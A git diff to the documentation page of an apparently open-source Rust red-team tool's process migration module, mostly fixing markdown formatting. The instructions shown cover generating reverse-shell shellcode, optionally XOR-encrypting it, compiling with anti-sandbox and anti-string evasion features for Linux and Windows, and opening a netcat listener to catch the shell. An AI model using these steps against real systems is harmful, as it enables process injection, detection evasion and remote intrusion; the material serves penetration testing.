@@ -12,7 +12,7 @@ datatable: true
 Target OS | Demo
 --------- | ----
 Linux     | ![gif](/gifs/process_migration.gif)
-Windows   | [![gif](/gifs/process_migration_windows.gif)
+Windows   | ![gif](/gifs/process_migration_windows.gif)
 
 <div class="datatable-end"></div>
 
@@ -32,14 +32,14 @@ shell shellcode for the target operating system)
 and change the shellcode to the shellcode generated in step 1
 3.  [Optional] Encrypt the shellcode and target process using [xor_params](https://github.com/kmanc/remote_code_oxidation/blob/master/xor_shellcode) and update the encrypted shellcode value in [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs) 
 4.  [Not shown in GIF] Compile the executable, only including `--features xor` if you did step 3
-  1.  Build for Linux target
-  ```commandline
-  cargo build -p process_migration [xor][,][antisand][,][antistring]] --release
-  ```
-  2.  Build for Windows target
-  ```commandline
-  cargo build --target x86_64-pc-windows-gnu -p process_migration [xor][,][antisand][,][antistring]] --release
-  ```
+    1.  Build for Linux target
+    ```commandline
+    cargo build -p process_migration [antisand][,][antistring][,][xor]] --release
+    ```
+    2.  Build for Windows target
+    ```commandline
+    cargo build --target x86_64-pc-windows-gnu -p process_migration [antisand][,][antistring][,][xor]] --release
+    ```
 5.  Start a netcat listener on the attacking machine on the same port you configured the shellcode to connect to in step 1
 ```commandline
 nc -nlvp 4444
